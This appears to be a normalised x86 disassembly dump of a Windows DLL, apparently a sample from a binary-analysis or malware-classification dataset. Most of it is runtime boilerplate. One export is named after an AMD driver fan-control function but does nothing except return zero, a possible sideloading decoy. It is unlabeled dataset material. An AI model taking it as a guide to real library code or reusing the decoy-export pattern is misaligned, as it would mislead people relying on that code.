call sub_1000bd19
int3
sub_100348de
mov [ ecx ] r--data
jmp sub_10005296
sub_10034b73
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x18 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10001460
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10035ef9
xor eax eax
retn
sub_10035fc9
xor eax eax
inc eax
retn
sub_10035fcd
mov esp [ ebp - 0x18 ]
call sub_10059574
sub_10036530
mov eax [ ecx + 0xc ]
test eax eax
je r-xdata
retn
push eax
call sub_1006591f
pop ecx
sub_10036620
xor eax eax
retn 0x4
sub_100368f0
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ ecx ]
mov edx [ eax ]
jmp edx
xor eax eax
retn
sub_10036930
mov eax [ ecx + 0x4 ]
retn
sub_10036ff0
mov ecx [ eax + 0x4 ]
push ecx
call sub_1006591f
pop ecx
retn
sub_100372cf
xor eax eax
retn 0x8
sub_100379d0
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_1001734f
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
int3
sub_10037b40
mov eax [ ecx + 0xc ]
test eax eax
je r-xdata
retn
push eax
push 0x0
mov [ eax ] r--data
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_10037c2e
push 0xd
call sub_100106d4
pop ecx
retn
sub_10037c3a
push 0xc
call sub_100106d4
pop ecx
retn
sub_10037d74
call sub_10039c8c
mov eax [ eax + 0x7c ]
test eax eax
je r-xdata
jmp sub_10059574
call eax
sub_10037ef0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
jmp eax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov eax [ eax ]
movzx eax [ eax ]
retn
sub_10037f51
jmp r-xdata
cmp [ rw-data ] 0xa
jb r-xdata
mov eax [ rw-data ]
mov eax [ eax * 4 + rw-data ]
inc [ rw-data ]
push eax
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
retn
call eax
sub_10038113
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_1003f7a0
mov eax [ ebp + 0x8 ]
leave
retn 0x14
sub_1003812f
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x14 ] 0x0
mov [ esi ] r--data
je r-xdata
mov [ esi ] r--data
pop esi
retn
push [ esi + 0x10 ]
call sub_10022b5a
pop ecx
sub_100394c5
cmp [ ebp + 0x10 ] edi
jne r-xdata
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
call sub_1001d628
sub_10039661
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_100154d5
mov eax [ ebp + 0x8 ]
leave
retn 0x14
sub_100399c0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x1c ]
push edi
mov edi [ ebp + 0x14 ]
push eax
call sub_10046710
pop edi
pop ebp
retn
sub_10039bcb
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ EnterCriticalSection@IAT ]
pop ebp
retn
j_sub_100680ab
jmp sub_100680ab
sub_1003a399
call [ TlsAlloc@IAT ]
retn 0x4
sub_1003b3e5
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
push 0x0
push 0x0
call sub_1000bd19
int3
call sub_10051e40
sub_1003bd97
mov eax [ ecx + 0x8 ]
retn
sub_1003be34
mov edi edi
push esi
mov esi ecx
push [ esi + 0x8 ]
call sub_1005cc3f
push [ esi + 0xc ]
call sub_1005cc3f
pop ecx
pop ecx
pop esi
retn
sub_1003c050
push esi
mov esi [ ecx + 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov ecx esi
call sub_10016cd0
push esi
call sub_1006591f
add esp 0x4
sub_1003c0f0
mov edi edi
push esi
mov esi ecx
push [ esi + 0x8 ]
mov [ esi ] r--data
call sub_10022b5a
pop ecx
mov [ esi ] r--data
pop esi
retn
sub_1003c405
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_1007926d
add esp 0xc
pop ebp
retn
sub_1003c6eb
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_1001d665
sub_1003cd9e
mov edx [ ebp - 0x14 ]
push edx
call sub_1006591f
add esp 0x4
push 0x0
push 0x0
call sub_1000bd19
int3
sub_1003cdb4
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_100213dc
push [ esi ]
call sub_1006591f
pop ecx
pop ecx
pop esi
retn
ADL_Overdrive5_FanSpeed_Set
push 0x0
call [ GetModuleHandleW@IAT ]
xor eax eax
retn
sub_1003da17
call sub_10039c8c
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0x8 ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_1004beba
sub_1003f5b8
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov ecx [ ecx ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0x0
pop ebp
retn 0x8
sub_1003fda4
or eax 0xffffffff
retn 0x8
sub_1003fdaa
mov edi edi
push esi
mov esi ecx
push [ esi + 0x8 ]
mov [ esi ] r--data
call sub_10022b5a
pop ecx
mov [ esi ] r--data
pop esi
retn
sub_100405a0
xor eax eax
retn 0x8
sub_10040704
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
call sub_100309a9
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
leave
retn 0x4
sub_10040d90
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
retn
sub_100418d1
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_100371bb
sub_10041a10
push 0x5
pop eax
retn
sub_10042d15
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_1002a7d5
pop ecx
pop ecx
pop ebp
retn
sub_10042e80
mov eax 0x80004001
retn 0x14
sub_10042f1b
push 0x1
call sub_100106d4
pop ecx
retn
sub_1004434f
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_1000a0d8
sub_10044390
call sub_10049fdf
retn
sub_100449b0
mov eax [ eax ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
mov eax [ edx + eax + 0x38 ]
test eax eax
je r-xdata
retn
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x8 ]
jmp eax
sub_100466ff
mov edi edi
push ebp
mov ebp esp
push ecx
fwait
fnstsw [ ebp - 0x4 ]
movsx eax [ ebp - 0x4 ]
leave
retn
sub_10047510
push esi
mov esi ecx
mov eax [ esi + 0x90 ]
test eax eax
je r-xdata
pop esi
retn
push eax
call [ FreeLibrary@IAT ]
mov [ esi + 0x90 ] 0x0
sub_1004759c
push esi
call sub_10039d78
pop ecx
retn
sub_100482aa
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0x8 ]
call sub_1000d161
pop ecx
pop ecx
pop ebp
retn 0x4
sub_10049fdf
push 0x8
call sub_100106d4
pop ecx
retn
sub_1004aff3
mov eax [ ebp - 0x14 ]
push eax
call sub_1006591f
add esp 0x4
push 0x0
push 0x0
call sub_1000bd19
int3
sub_1004bf27
push 0xc
call sub_100106d4
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_1004bff1
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x14 ] 0x0
mov [ esi ] r--data
je r-xdata
mov [ esi ] r--data
pop esi
retn
push [ esi + 0x10 ]
call sub_10022b5a
pop ecx
sub_1004c0e8
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10022954
add esp 0x10
pop ebp
retn
sub_1004c5dd
mov ecx [ ebp - 0x14 ]
call sub_1003be34
xor ebx ebx
push ebx
push ebx
call sub_1000bd19
int3
sub_1004d400
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push eax
push ecx
mov ecx [ ebp + 0x18 ]
call sub_1005eb00
pop ebp
retn
sub_1004d420
retn 0x4
sub_1004d501
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_1004d700
or eax 0xffffffff
retn 0x4
sub_1004d7f0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push eax
mov esi ecx
call sub_1003c66c
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1004d907
mov eax 0x1
retn
sub_1004db01
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_1004df65
mov ecx [ ebp - 0x14 ]
call sub_10019f17
push 0x0
push 0x0
call sub_1000bd19
int3
sub_1004e200
mov eax 0x80004001
retn 0xc
sub_1004e208
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x8 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10001460
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_1004ed38
push ebx
call sub_100617e7
pop ecx
retn
sub_1004fa89
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
jmp sub_1004db01
sub_1004fa98
mov [ ecx ] r--data
retn
sub_1004fc40
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_100509fc
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x10 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10001460
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10050d29
mov ecx [ ebp - 0x18 ]
xor esi esi
push esi
push 0x1
call sub_1000aecf
push esi
push esi
call sub_1000bd19
int3
sub_10050f50
mov eax [ ecx ]
cmp eax 0x4
jge r-xdata
retn
imul eax eax 0x18
add eax rw-data
push eax
call sub_1001e610
pop ecx
sub_10050f67
push 0x1
call sub_1007d8a7
pop ecx
retn
sub_10051158
mov eax 0x1
retn
sub_10051250
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
mov eax esi
pop esi
pop ebp
retn
call [ GetLastError@IAT ]
sub_100514f0
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
push eax
push ecx
push 0x100
push edx
call sub_1001737a
add esp 0x10
pop ebp
retn
sub_1005150b
call sub_10039c8c
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0x4 ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_1004beba
sub_10051531
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_1000a2b0
mov eax [ ebp + 0x8 ]
leave
retn 0x14
sub_10051dfa
mov eax [ ecx + 0x4 ]
retn
sub_10051e40
push ecx
push esi
call sub_1002a0a0
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax esi
pop ecx
retn
sub_10051f6c
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
mov eax [ ecx ]
and [ ebp - 0x4 ] 0x0
call [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_1005216a
mov eax sub_1001c34c
mov [ rw-data ] eax
mov [ rw-data ] sub_10019279
mov [ rw-data ] sub_10032418
mov [ rw-data ] sub_10042d15
mov [ rw-data ] sub_10004005
mov [ rw-data ] eax
mov [ rw-data ] sub_1001928c
mov [ rw-data ] sub_1001893a
mov [ rw-data ] sub_10034295
mov [ rw-data ] sub_1002a7d5
retn
sub_100521ca
xor al al
retn
sub_10052bdb
push 0xe
call sub_100106d4
pop ecx
retn
sub_10052d60
push ecx
mov [ ecx ] r--data
call sub_10058a25
pop ecx
retn
sub_10052df5
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0x8 ]
call sub_1000a4a1
pop ecx
pop ecx
pop ebp
retn 0x4
sub_10053183
mov edi edi
push esi
mov esi ecx
push [ esi + 0x8 ]
call sub_1005cc3f
push [ esi + 0x10 ]
call sub_1005cc3f
push [ esi + 0x14 ]
call sub_1005cc3f
add esp 0xc
pop esi
retn
sub_10053336
push 0xa
call sub_100106d4
pop ecx
retn
sub_100543ec
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call [ CloseHandle@IAT ]
sub_100550a7
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_1003c66c
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10055130
push ebp
mov ebp esp
movzx eax [ ebp + 0x8 ]
add ecx 0x8
push ecx
push eax
call sub_10004749
add esp 0x8
pop ebp
retn 0x4
sub_100552c0
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
pop esi
retn
push eax
call sub_10022b5a
add esp 0x4
sub_10055686
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_1005bb78
sub_100558d8
mov ecx [ ebp - 0x1c ]
call sub_10053183
xor ebx ebx
push ebx
push ebx
call sub_1000bd19
int3
sub_100572a0
push ebp
mov ebp esp
pop ebp
jmp sub_1006591f
sub_10057674
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_100577f1
mov eax 0x1
retn
sub_10057d5b
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
xor edx edx
cmp [ ecx ] 0xc0000005
sete dl
mov eax edx
retn
sub_10058bff
mov eax [ rw-data ]
retn
sub_10058e83
and [ rw-data ] 0x0
retn
sub_10058f99
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10033b21
add esp 0x10
pop ebp
retn
sub_10059574
push 0x8
push r--data
call sub_10079bf0
call sub_10039c8c
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_1001b2a6
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_10059594
xor eax eax
inc eax
retn
sub_100595ad
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10005862
add esp 0x14
pop ebp
retn
sub_100595ca
mov eax rw-data
retn
sub_10059d83
mov ecx [ ebp - 0x14 ]
call sub_10019f17
push 0x0
push 0x0
call sub_1000bd19
int3
sub_10059fd6
mov edi edi
push ebp
mov ebp esp
xor eax eax
inc eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
xor eax eax
sub_1005a25e
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10041b5a
add esp 0x14
pop ebp
retn
sub_1005a547
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10012920
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_1005aef6
mov ecx [ ebp - 0x18 ]
call sub_10053183
xor ebx ebx
push ebx
push ebx
call sub_1000bd19
int3
sub_1005b7cd
pop eax
pop ecx
xchg [ esp ] eax
jmp eax
sub_1005b7e0
mov eax [ ecx + 0x4 ]
push eax
call sub_1006591f
pop ecx
retn
sub_1005bb49
mov edi edi
push ebp
mov ebp esp
mov ecx [ ecx + 0x24 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn 0x4
sub_1005bb5a
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
retn
push [ esi + 0x4 ]
call sub_10022b5a
pop ecx
sub_1005bb78
mov edi edi
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_1002f2e0
add esp 0xc
pop ebp
retn
sub_1005c994
push [ ecx ]
call sub_1001e610
pop ecx
retn
sub_1005c9a0
mov eax 0x6
retn
sub_1005cc20
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn 0x14
cmp eax [ ebp + 0xc ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x1
sub_1005cfb0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ ecx ] edx
pop ebp
retn
sub_1005cfc0
retn 0x4
sub_1005d215
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_1003c66c
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1005d232
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
pop ebp
retn 0x8
sub_1005d423
mov eax [ ebp - 0x14 ]
push eax
call sub_1006591f
add esp 0x4
push 0x0
push 0x0
call sub_1000bd19
int3
sub_1005d440
push ebp
mov ebp esp
pop ebp
jmp sub_1004ac7a
sub_1005d5d0
push 0x0
call sub_10022a6a
pop ecx
retn
sub_1005de97
push 0x0
push 0x1
call sub_1000aecf
retn
sub_1005deb0
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
cdq
retn
mov ecx [ ecx + 0x34 ]
mov eax [ ecx ]
cdq
retn
sub_1005e150
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cl [ eax + 0x3e ]
mov edx [ ebp + 0xc ]
cmp [ edx + 0x3e ] cl
sbb eax eax
neg eax
pop ebp
retn
sub_1005e357
push [ ebp - 0x14 ]
call sub_10057f23
pop ecx
retn
sub_1005e39b
call sub_10039c8c
cmp [ eax + 0x90 ] 0x0
jle r-xdata
retn
call sub_10039c8c
dec [ eax + 0x90 ]
sub_1005e450
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
retn
mov eax [ esi ]
push eax
call sub_1006591f
add esp 0x4
sub_1005ee87
mov edi edi
push ebp
mov ebp esp
call sub_1005216a
cmp [ ebp + 0x8 ] 0x0
je r-xdata
fnclex
pop ebp
retn
call sub_10035f1c
sub_1005f1a6
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_1002ba63
pop ecx
mov [ rw-data ] 0x1
sub_1005f2af
push 0xa
call sub_100106d4
pop ecx
retn
sub_1005f2f0
mov [ ecx ] r--data
jmp sub_10005296
sub_1005f610
xor eax eax
retn
sub_10060aab
mov eax r-xdata
retn
sub_100614c9
call sub_10039c8c
mov ecx eax
mov eax [ ecx + 0x14 ]
imul eax eax 0x343fd
add eax 0x269ec3
mov [ ecx + 0x14 ] eax
shr eax 0x10
and eax 0x7fff
retn
sub_10062816
mov edi edi
push esi
call sub_10007cfe
mov esi [ eax + 0x4 ]
call sub_1003da17
mov edx eax
mov eax esi
pop esi
retn
sub_10065892
mov edi edi
push ecx
mov [ ecx ] r--data
call sub_10052b74
pop ecx
retn
sub_100658b0
mov eax 0x1
retn 0x4
sub_1006590e
push sub_10059574
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
retn
sub_100662c2
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_1004435a
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_10066597
mov edi edi
push ebp
mov ebp esp
call sub_10039c8c
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x14 ] ecx
pop ebp
retn
sub_10066fa7
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax ]
mov eax [ eax + 0xac ]
pop ebp
retn
pop ebp
jmp sub_1006bc7c
sub_10067f80
push ebp
mov ebp esp
pop ebp
jmp sub_10055606
sub_100680ab
call sub_10039c8c
xor ecx ecx
cmp [ eax + 0x90 ] ecx
setne al
retn
sub_100680bc
call sub_10039c8c
mov ecx [ eax + 0x6c ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
retn
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_1004beba
sub_100680f0
xor eax eax
xor edx edx
retn
sub_10068119
xor eax eax
inc eax
retn
sub_1006818d
mov edi edi
push ebp
mov ebp esp
call sub_100559e6
push [ ebp + 0x8 ]
call sub_10017abb
pop ecx
push 0xff
call sub_1003c405
int3
sub_100687ad
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_1003b946
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10069d2b
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x10 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_1003b946
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_1006b5ae
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ InitializeCriticalSection@IAT ]
pop ebp
retn
sub_1006bc19
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_1003c66c
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1006bc7c
call sub_10039c8c
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0xac ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_1004beba
sub_1006bd10
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
pop ebp
retn 0x8
sub_1006bd80
push esi
push 0x0
mov [ esi ] r--data
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax esi
retn
sub_1006c950
push 0x0
call sub_10016cad
int3
sub_1006d3f0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push eax
call sub_1004ac7a
add esp 0x4
pop ebp
retn
sub_1006d410
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push eax
call sub_10022b5a
add esp 0x4
pop ebp
retn
sub_10072550
mov eax 0x1
retn
sub_10074050
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
mov [ ecx ] 0x0
mov ecx 0x20
call sub_100739a0
pop ebx
pop ebp
retn
sub_100741a0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
mov [ ecx ] 0x2
mov ecx 0x20
call sub_100739a0
pop ebx
pop ebp
retn
sub_100791c7
push 0xc
push r--data
call sub_10079bf0
call sub_10039c8c
and [ ebp - 0x4 ] 0x0
push [ eax + 0x58 ]
call [ eax + 0x54 ]
push eax
call sub_1001bc63
sub_100791fc
mov esp [ ebp - 0x18 ]
push [ ebp - 0x1c ]
call sub_1003c405
int3
sub_10079398
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_100106d4
pop ecx
sub_10079600
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
push eax
push ecx
call sub_10055328
pop ecx
pop ecx
retn
sub_10079c35
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_1007b783
dec [ edx + 0x4 ]
js r-xdata
push edx
call sub_1005882e
pop ecx
retn
mov ecx [ edx ]
movzx eax [ ecx ]
inc ecx
mov [ edx ] ecx
retn
sub_1007baa9
push 0x4
mov eax sub_1007f266
call sub_1002152b
call sub_10039c8c
cmp [ eax + 0x94 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_10037d74
call sub_100680f5
sub_1007bb82
mov eax [ ebp - 0x14 ]
call sub_1007b9ee
retn
sub_1007c406
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_1007c330
add esp 0xc
pop ebp
retn 0x4
sub_1007c439
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_1007d885
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_1007c46b
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_1007c330
add esp 0xc
pop ebp
retn 0x8
sub_1007d0d6
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_1007a540
sub_1007d859
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_1007d790
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_1007d8a4
call eax
retn
sub_1007d949
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_100473ea
pop ecx
pop ecx
retn
sub_1007d978
push 0x1
call sub_100106d4
pop ecx
retn
sub_1007de41
push r-xdata
call sub_100662c2
neg eax
sbb eax eax
pop ecx
and eax 0x18
retn
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_1007ec69
push 0x7
call sub_100106d4
pop ecx
retn
sub_1007edc0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_1007ede0
lea ecx [ ebp - 0x2c ]
jmp sub_10061060
sub_1007ede8
lea ecx [ ebp - 0x48 ]
jmp sub_10061060
sub_1007edf0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x50 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_1007ee20
lea ecx [ ebp - 0x54 ]
jmp sub_10061060
sub_1007ee28
lea ecx [ ebp - 0x70 ]
jmp sub_10061060
sub_1007ee30
lea ecx [ ebp - 0x8c ]
jmp sub_10061060
sub_1007ee3b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x94 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_1007ee70
lea ecx [ ebp + 0x10 ]
jmp sub_10061060
sub_1007ee78
lea ecx [ ebp - 0x54 ]
jmp sub_10061060
sub_1007ee80
lea ecx [ ebp - 0x8c ]
jmp sub_10061060
sub_1007ee8b
lea ecx [ ebp - 0x70 ]
jmp sub_10061060
sub_1007ee93
lea ecx [ ebp - 0xa8 ]
jmp sub_10061060
sub_1007ee9e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xd0 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_1007eed0
lea ecx [ ebp - 0xe4 ]
jmp sub_10061060
sub_1007eedb
mov eax [ ebp - 0xfc ]
push eax
call sub_1006591f
pop ecx
retn
sub_1007eee9
lea ecx [ ebp - 0x74 ]
jmp sub_10029c40
sub_1007eef1
lea ecx [ ebp - 0x58 ]
jmp sub_10061060
sub_1007eef9
lea ecx [ ebp - 0x58 ]
jmp sub_10061060
sub_1007ef01
lea ecx [ ebp - 0x58 ]
jmp sub_10061060
sub_1007ef09
lea ecx [ ebp - 0x90 ]
jmp sub_10061060
sub_1007ef14
lea ecx [ ebp - 0xac ]
jmp sub_10061060
sub_1007ef1f
lea ecx [ ebp - 0xac ]
jmp sub_10029c40
sub_1007ef2a
lea ecx [ ebp - 0xf8 ]
jmp sub_1001ed50
sub_1007ef35
lea ecx [ ebp - 0xc8 ]
jmp sub_10061060
sub_1007ef40
lea ecx [ ebp - 0x90 ]
jmp sub_10061060
sub_1007ef4b
lea ecx [ ebp - 0x58 ]
jmp sub_10061060
sub_1007ef53
lea ecx [ ebp - 0xac ]
jmp sub_10061060
sub_1007ef5e
lea ecx [ ebp - 0xac ]
jmp sub_10061060
sub_1007ef69
lea ecx [ ebp - 0x58 ]
jmp sub_10061060
sub_1007ef71
lea ecx [ ebp - 0xac ]
jmp sub_10061060
sub_1007ef7c
